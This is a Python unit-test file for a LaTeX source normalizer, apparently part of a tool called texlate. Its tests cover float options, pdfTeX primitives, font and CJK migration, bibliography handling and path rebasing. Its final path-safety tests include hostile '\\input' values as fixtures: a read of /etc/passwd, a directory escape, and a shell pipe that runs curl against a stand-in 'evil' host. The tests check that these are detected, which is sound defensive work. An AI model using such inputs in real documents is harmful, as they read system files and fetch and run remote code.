"""normalize.py 十二项无条件手术的单测（docs/08 §3.2 逐条对应）。"""

from pathlib import Path

from texlate.compile.normalize import (
    PIXEL_COMPATIBILITY,
    TECTONIC_FONT_COMPATIBILITY,
    XETEX_COMPATIBILITY,
    normalize_comment_terminators,
    normalize_engine,
    normalize_float_positions,
    normalize_legacy_cjk,
    normalize_pdf_primitives,
    normalize_pdftex_features,
    normalize_pixel_dimensions,
    normalize_project,
    rebase_project_paths,
    source_path_violations,
    strip_input_encodings,
    use_bundled_bibliography,
)


# 1. comment 终结行
def test_comment_terminators_strip_trailing_ws() -> None:
    tex = "a\n\\end{comment}  \t\nb"
    assert "\\end{comment}\n" in normalize_comment_terminators(tex)


def test_comment_terminators_idempotent_clean() -> None:
    tex = "a\n\\end{comment}\nb"
    assert normalize_comment_terminators(tex) == tex


# 2. float 位置参数
def test_float_positions_illegal_letter() -> None:
    """`[!htbpX]` 的非法字母 X 剥掉 → `[!htbp]`。"""
    tex = "\\begin{figure}[!htbpX]\nx\\end{figure}"
    out = normalize_float_positions(tex)
    assert "[!htbp]" in out


def test_float_positions_all_illegal_drops_bracket() -> None:
    tex = "\\begin{table}[xyz]\nx\\end{table}"
    out = normalize_float_positions(tex)
    assert "\\begin{table}\nx" in out


def test_float_positions_symbol_chars_untouched() -> None:
    """`[^@]` 这类含符号的位置参数不匹配正则——保持上游语义不改。"""
    tex = "\\begin{table}[^@]\nx\\end{table}"
    assert normalize_float_positions(tex) == tex


# 3. pdfTeX 特性
def test_pdftex_output_settings_removed() -> None:
    tex = "\\pdfcompresslevel=9\n\\input{glyphtounicode}\nkeep"
    out = normalize_pdftex_features(tex, "xelatex")
    assert "\\pdfcompresslevel" not in out
    assert "glyphtounicode" not in out
    assert "keep" in out
    assert out.count("\n") == tex.count("\n")


def test_microtype_unsupported_options() -> None:
    tex = "\\usepackage[protrusion=true,expansion=true,tracking=true]{microtype}"
    xe = normalize_pdftex_features(tex, "xelatex")
    assert "expansion=false" in xe
    assert "tracking=true" in xe  # xelatex 保留 tracking
    tec = normalize_pdftex_features(tex, "tectonic")
    assert "tracking=false" in tec  # tectonic bundle microtype 无 tracking


# 4. px → \pdfpxdimen（语境受限）
def test_pixel_dimensions_includegraphics() -> None:
    tex = "\\includegraphics[width=360px]{a.pdf}"
    out = normalize_pixel_dimensions(tex)
    assert r"360\pdfpxdimen" in out


def test_pixel_dimensions_setlength() -> None:
    tex = "\\setlength{\\foo}{12px}"
    out = normalize_pixel_dimensions(tex)
    assert r"12\pdfpxdimen" in out


def test_pixel_dimensions_not_global() -> None:
    """散文里的 "360px" 描述文本不被误改。"""
    tex = "The image is 360px wide in CSS terms."
    assert normalize_pixel_dimensions(tex) == tex


# 5. 兼容前导块
def test_compat_blocks_injected_once() -> None:
    tex = "\\documentclass{article}\n\\begin{document}\nx\n\\end{document}"
    out = normalize_engine(tex, "tectonic")
    assert XETEX_COMPATIBILITY.strip().splitlines()[0] in out
    assert TECTONIC_FONT_COMPATIBILITY.strip().splitlines()[0] in out
    out2 = normalize_engine(out, "tectonic")
    assert out2.count("texlate-native") == out.count("texlate-native")


def test_pixel_block_only_when_pxd_used() -> None:
    plain = "\\documentclass{article}\n\\begin{document}\nx\n\\end{document}"
    out = normalize_engine(plain, "xelatex")
    assert "pdfpxdimen" not in out.split("\\begin{document}")[0]
    withpx = "\\documentclass{article}\n\\usepackage{graphicx}\n\\begin{document}\n\\includegraphics[width=5px]{a}\n\\end{document}"
    out2 = normalize_engine(withpx, "xelatex")
    assert PIXEL_COMPATIBILITY.strip() in out2


# 6. fontspec no-math 前插
def test_fontspec_no_math_prepended() -> None:
    tex = "\\documentclass{article}\n\\begin{document}\nx\n\\end{document}"
    out = normalize_engine(tex, "xelatex")
    assert out.startswith("\\PassOptionsToPackage{no-math}{fontspec}")


# 7. inputenc/fontenc
def test_strip_inputenc_keeps_others() -> None:
    tex = "\\usepackage[utf8]{inputenc,amsmath,T1fontenc}\n\\usepackage{fontenc}"
    out = strip_input_encodings(tex.replace("T1fontenc", "fontenc"))
    assert "amsmath" in out
    assert "inputenc" not in out


def test_strip_inputenc_list_only_removes_named() -> None:
    tex = "\\usepackage[utf8]{inputenc,amsmath}"
    out = strip_input_encodings(tex)
    assert "{amsmath}" in out


# 8. pdfinfo / pdfoutput / 驱动选项
def test_pdfinfo_removed() -> None:
    tex = "\\pdfinfo{/Title (Hi)}\nkeep"
    out = normalize_pdf_primitives(tex)
    assert "\\pdfinfo" not in out
    assert "keep" in out


def test_pdfoutput_removed() -> None:
    tex = "\\pdfoutput=1\nkeep"
    out = normalize_pdf_primitives(tex)
    assert "\\pdfoutput" not in out


def test_driver_option_pdftex_to_xetex() -> None:
    tex = "\\usepackage[pdftex,bookmarks]{hyperref}\n\\usepackage[pdftex]{graphicx}"
    out = normalize_pdf_primitives(tex)
    assert "[xetex,bookmarks]" in out
    assert "[xetex]{graphicx}" in out


def test_driver_option_unrelated_untouched() -> None:
    tex = "\\usepackage[pdftex]{amsmath}"
    assert normalize_pdf_primitives(tex) == tex


# 9. OT1/T1 → TU（project 级）
def test_legacy_latin_fonts(tmp_path: Path) -> None:
    tex = (
        "\\documentclass{article}\n"
        "\\begin{document}\n"
        "{\\fontfamily{ptm}\\selectfont hello}\n"
        "\\end{document}\n"
    )
    (tmp_path / "main.tex").write_text(tex)
    normalize_project(tmp_path, "xelatex")
    out = (tmp_path / "main.tex").read_text()
    assert "texlate-ptm" in out
    assert "NFSSFamily=texlate-ptm" in out
    assert "texgyretermes-regular.otf" in out


# 10. legacy CJK
def test_legacy_cjk_to_xecjk() -> None:
    tex = (
        "\\documentclass{article}\n\\usepackage{CJKutf8}\n"
        "\\begin{document}\n\\begin{CJK}{UTF8}{gbsn}x\\end{CJK}\n\\end{document}"
    )
    out = normalize_legacy_cjk(tex, "xelatex")
    assert "CJKutf8" not in out
    assert "xeCJK" in out
    assert "FandolSong" in out
    assert "\\begin{CJK}" not in out


# 11. bundled .bbl
def test_bundled_bibliography(tmp_path: Path) -> None:
    main = tmp_path / "main.tex"
    main.write_text(
        "\\documentclass{article}\n\\begin{document}\nx\n"
        "\\bibliography{refs}\n\\end{document}"
    )
    (tmp_path / "main.bbl").write_text(
        "\\begin{thebibliography}{9}\\end{thebibliography}"
    )
    out = use_bundled_bibliography(main.read_text(), main)
    assert r"\input{main.bbl}" in out


def test_bundled_bibliography_bib_present_noop(tmp_path: Path) -> None:
    main = tmp_path / "main.tex"
    main.write_text("\\bibliography{refs}")
    (tmp_path / "main.bbl").write_text(
        "\\begin{thebibliography}{9}\\end{thebibliography}"
    )
    (tmp_path / "refs.bib").write_text("@article{a,title={t}}")
    assert use_bundled_bibliography(main.read_text(), main) == "\\bibliography{refs}"


def test_bundled_bibliography_verbatim_immune(tmp_path: Path) -> None:
    """lstlisting 里展示的 \\bibliography 示例不得被改写（verbatim 体遮盖）。"""
    main = tmp_path / "main.tex"
    main.write_text(
        "\\documentclass{article}\n\\begin{document}\n"
        "\\begin{lstlisting}\n\\bibliography{refs}\n\\end{lstlisting}\n"
        "\\end{document}"
    )
    (tmp_path / "main.bbl").write_text(
        "\\begin{thebibliography}{9}\\end{thebibliography}"
    )
    assert use_bundled_bibliography(main.read_text(), main) == main.read_text()


# 12. rebase 越界路径
def test_rebase_project_paths(tmp_path: Path) -> None:
    """根层主文件 `\\input{../shared/x}`（越界）→ 包内 `shared/x` 存在则改写。"""
    (tmp_path / "main.tex").write_text("\\input{../shared/macros.tex}\n")
    shared = tmp_path / "shared"
    shared.mkdir()
    (shared / "macros.tex").write_text("% macros\n")
    locs = rebase_project_paths(tmp_path, "main.tex")
    assert locs
    out = (tmp_path / "main.tex").read_text()
    assert "\\input{shared/macros.tex}" in out
    assert "../" not in out


def test_source_path_violations_absolute(tmp_path: Path) -> None:
    (tmp_path / "main.tex").write_text("\\input{/etc/passwd}\n")
    violations = list(source_path_violations(tmp_path, "main.tex"))
    assert violations


def test_source_path_violations_escape_outside(tmp_path: Path) -> None:
    (tmp_path / "main.tex").write_text("\\input{../../outside.tex}\n")
    violations = list(source_path_violations(tmp_path, "main.tex"))
    assert violations


def test_source_path_violations_pipe(tmp_path: Path) -> None:
    (tmp_path / "main.tex").write_text("\\input{|curl evil.sh}\n")
    violations = list(source_path_violations(tmp_path, "main.tex"))
    assert violations


def test_normalize_engine_lualatex_only_cjk() -> None:
    """lualatex 不走 XeTeX 手术，只换 legacy CJK。"""
    tex = "\\documentclass{article}\n\\pdfcompresslevel=9\n\\begin{document}\nx\\end{document}"
    out = normalize_engine(tex, "lualatex")
    assert "\\pdfcompresslevel=9" in out  # lualatex 保留 pdftex 原语
